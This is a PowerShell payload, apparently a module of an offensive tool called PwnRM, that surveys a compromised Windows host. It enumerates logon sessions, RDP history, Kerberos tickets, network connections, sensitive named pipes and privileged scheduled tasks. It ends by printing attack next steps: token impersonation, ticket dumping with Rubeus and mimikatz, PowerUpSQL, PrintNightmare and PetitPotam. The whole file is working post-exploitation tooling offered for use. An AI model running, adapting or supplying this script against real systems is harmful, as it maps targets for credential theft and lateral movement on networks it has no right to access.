# ── PwnRM Session Scout PowerShell payload ───────────────────────────────────
# Self-contained active logon session + network connection snapshot.
# Runs entirely inside the remote PowerShell session — no extra tools on target.
# Covers: interactive/remote logon sessions, RDP clients, Kerberos tickets,
#         established TCP connections, listening ports, and named pipe exposure.

function Invoke-PwnRMSessions {
    param([switch]$Quick)
    $sep = '=' * 72
    function hdr($t) { Write-Host "`n$sep`n  [*] $t`n$sep" -ForegroundColor Cyan }
    function ok($m)  { Write-Host "  [+] $m" -ForegroundColor Green }
    function inf($m) { Write-Host "  [-] $m" }
    function wrn($m) { Write-Host "  [!] $m" -ForegroundColor Yellow }

    # ── 0. Currently logged-on users (WMI Win32_ComputerSystem + LogonSession) ─
    hdr "Active Logon Sessions"
    try {
        $logons = Get-WmiObject -Class Win32_LogonSession -ErrorAction Stop
        $users  = Get-WmiObject -Class Win32_LoggedOnUser  -ErrorAction Stop

        $map = @{}
        $users | ForEach-Object {
            $antecedent = $_.Antecedent   # Win32_UserAccount
            $dependent  = $_.Dependent    # Win32_LogonSession
            if ($antecedent -match 'Domain="([^"]+)",Name="([^"]+)"') {
                $dom_  = $Matches[1]
                $uname = $Matches[2]
            } else { $dom_ = "?"; $uname = "?" }
            if ($dependent -match 'LogonId="([^"]+)"') {
                $lid = $Matches[1]
            } else { $lid = "?" }
            $map[$lid] = "$dom_\$uname"
        }

        $logonTypes = @{
            2="Interactive"; 3="Network"; 4="Batch"; 5="Service";
            7="Unlock"; 8="NetworkCleartext"; 9="NewCredentials";
            10="RemoteInteractive(RDP)"; 11="CachedInteractive"; 12="CachedRemoteInteractive"
        }

        $logons | Sort-Object LogonType | ForEach-Object {
            $lid  = $_.LogonId
            $type = $logonTypes[[int]$_.LogonType]
            if (-not $type) { $type = "Type$($_.LogonType)" }
            $who  = if ($map[$lid]) { $map[$lid] } else { "(unknown)" }
            $start= if ($_.StartTime) { [Management.ManagementDateTimeConverter]::ToDateTime($_.StartTime).ToString("yyyy-MM-dd HH:mm:ss") } else { "?" }
            $auth = $_.AuthenticationPackage

            if ($_.LogonType -in @(10,2,3)) {
                ok "Session $lid  |  $type  |  $who  |  $auth  |  since $start"
            } else {
                inf "Session $lid  |  $type  |  $who  |  $auth  |  since $start"
            }
        }
    } catch {
        # Fallback: query sessions via qwinsta
        try {
            $q = qwinsta 2>&1
            $q | ForEach-Object { inf "  $_" }
        } catch { wrn "Could not enumerate logon sessions: $_" }
    }

    # ── 1. RDP client MRU (recently connected targets) ───────────────────────
    hdr "RDP Client History (MRU)"
    try {
        $rdpKey = "HKCU:\Software\Microsoft\Terminal Server Client\Default"
        if (Test-Path $rdpKey) {
            $mru = Get-ItemProperty -Path $rdpKey -ErrorAction Stop
            $mru.PSObject.Properties |
            Where-Object { $_.Name -match "^MRU" } |
            ForEach-Object { wrn "RDP target: $($_.Value)" }
        } else { inf "No RDP MRU entries found." }

        # Per-server saved credentials
        $serverKey = "HKCU:\Software\Microsoft\Terminal Server Client\Servers"
        if (Test-Path $serverKey) {
            Get-ChildItem $serverKey | ForEach-Object {
                $srv = $_.PSChildName
                $uname = (Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue).UsernameHint
                wrn "RDP saved: $srv  (UsernameHint: $uname)"
            }
        }
    } catch { wrn "RDP MRU query failed: $_" }

    if ($Quick) {
        Write-Host "`n$sep`n  [*] Sessions quick scan complete.`n$sep`n" -ForegroundColor Cyan
        return
    }

    # ── 2. Kerberos ticket cache ──────────────────────────────────────────────
    hdr "Kerberos Ticket Cache (klist)"
    try {
        $klist = klist 2>&1
        if ($klist -match "Cached Tickets") {
            $klist | ForEach-Object {
                $line = "$_"
                if ($line -match "Server:|Client:|KerbTicket|Renew Until|Start Time|End Time") {
                    inf "  $line"
                } elseif ($line -match "krbtgt") {
                    wrn "  TGT: $line"
                } elseif ($line -match "Flags.*forwardable|renewable") {
                    ok "  $line"
                }
            }
        } else {
            $klist | ForEach-Object { inf "  $_" }
        }
    } catch { wrn "klist not available: $_" }

    # ── 3. Active network connections ─────────────────────────────────────────
    hdr "Active TCP Connections (ESTABLISHED)"
    try {
        $conns = Get-NetTCPConnection -State Established -ErrorAction Stop
        if ($conns.Count -eq 0) {
            inf "No established connections."
        } else {
            # Group by remote address, flag internal vs external
            $conns | Sort-Object RemoteAddress | ForEach-Object {
                $c = $_
                try {
                    $proc = Get-Process -Id $c.OwningProcess -ErrorAction SilentlyContinue
                    $pname = if ($proc) { $proc.Name } else { "pid:$($c.OwningProcess)" }
                } catch { $pname = "pid:$($c.OwningProcess)" }

                $rip = $c.RemoteAddress
                $external = $rip -notmatch "^(10\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.|127\.|::1|fe80:)"
                $line = "  $($c.LocalAddress):$($c.LocalPort) → $($c.RemoteAddress):$($c.RemotePort)  [$pname]"
                if ($external) { wrn "EXTERNAL $line" }
                else { inf $line }
            }
        }
    } catch {
        # Fallback: netstat
        try {
            netstat -ano 2>&1 | Select-String "ESTABLISHED" | ForEach-Object { inf "  $_" }
        } catch { wrn "Could not enumerate connections: $_" }
    }

    # ── 4. Listening ports ────────────────────────────────────────────────────
    hdr "Listening Ports (TCP/UDP)"
    $interestingPorts = @{
        21="FTP"; 22="SSH"; 23="Telnet"; 25="SMTP"; 80="HTTP"; 88="Kerberos";
        110="POP3"; 135="MSRPC"; 139="NetBIOS"; 143="IMAP"; 389="LDAP";
        443="HTTPS"; 445="SMB"; 464="KerberosChangePass"; 514="Syslog";
        587="SMTP-Submission"; 636="LDAPS"; 993="IMAPS"; 1433="MSSQL";
        1521="Oracle"; 3268="GlobalCatalog"; 3269="GlobalCatalogSSL";
        3306="MySQL"; 3389="RDP"; 4444="Metasploit?"; 5432="PostgreSQL";
        5985="WinRM-HTTP"; 5986="WinRM-HTTPS"; 8080="HTTP-Alt"; 8443="HTTPS-Alt";
        9001="Tor?"; 47001="WinRM-Alt"
    }
    try {
        $listeners = Get-NetTCPConnection -State Listen -ErrorAction Stop
        $udpListeners = Get-NetUDPEndpoint -ErrorAction SilentlyContinue
        ($listeners | ForEach-Object {
            $port = $_.LocalPort
            $svc  = if ($interestingPorts[$port]) { " [$($interestingPorts[$port])]" } else { "" }
            try {
                $proc = Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue
                $pname = if ($proc) { $proc.Name } else { "pid:$($_.OwningProcess)" }
            } catch { $pname = "pid:$($_.OwningProcess)" }
            $line = "  TCP  $($_.LocalAddress):$port$svc  [$pname]"
            if ($interestingPorts[$port]) { ok $line } else { inf $line }
        })
    } catch {
        netstat -ano 2>&1 | Select-String "LISTENING" | ForEach-Object { inf "  $_" }
    }

    # ── 5. Named pipes (IPC surface) ──────────────────────────────────────────
    hdr "Exposed Named Pipes"
    try {
        $pipes = [System.IO.Directory]::GetFiles("\\.\pipe\") 2>&1
        $sensitivePipes = @("lsass","netlogon","samr","srvsvc","winreg",
                            "spoolss","atsvc","svcctl","epmapper","wkssvc",
                            "browser","netdfs","ntsvcs","plugplay","trkwks")
        $pipes | ForEach-Object {
            $pname = $_ -replace "\\\\\.\\pipe\\", ""
            $hit = $sensitivePipes | Where-Object { $pname -match $_ }
            if ($hit) {
                wrn "SENSITIVE PIPE: $pname"
            } else {
                inf "  pipe: $pname"
            }
        }
    } catch { wrn "Named pipe enumeration failed: $_" }

    # ── 6. Scheduled tasks with network context ───────────────────────────────
    hdr "Scheduled Tasks — Running as SYSTEM / High Integrity"
    try {
        Get-ScheduledTask -ErrorAction Stop | Where-Object {
            $_.Principal.RunLevel -eq "Highest" -or
            $_.Principal.UserId -match "SYSTEM|Administrator"
        } | Select-Object TaskName,TaskPath,
            @{N="User";E={$_.Principal.UserId}},
            @{N="State";E={$_.State}} |
        ForEach-Object {
            if ($_.State -eq "Running") {
                wrn "RUNNING  $($_.TaskPath)$($_.TaskName)  [as: $($_.User)]"
            } else {
                inf "  $($_.State.ToString().PadRight(8))  $($_.TaskPath)$($_.TaskName)  [as: $($_.User)]"
            }
        }
    } catch { wrn "ScheduledTask query failed: $_" }

    Write-Host "`n$sep" -ForegroundColor Cyan
    Write-Host "  [*] Session Scout complete. Suggested next steps:" -ForegroundColor Cyan
    Write-Host "  [-]  RDP sessions     : inject into via token impersonation (incognito)" -ForegroundColor White
    Write-Host "  [-]  Kerberos TGT     : dump with Rubeus dump / mimikatz sekurlsa::tickets" -ForegroundColor White
    Write-Host "  [-]  MSSQL port open  : !netrun with PowerUpSQL assembly" -ForegroundColor White
    Write-Host "  [-]  Sensitive pipes  : check SpoolSs/PrinterNightmare, PetitPotam (lsarpc)" -ForegroundColor White
    Write-Host "$sep`n" -ForegroundColor Cyan
}

Invoke-PwnRMSessions -Quick:$([bool]::Parse('__QUICK__'))
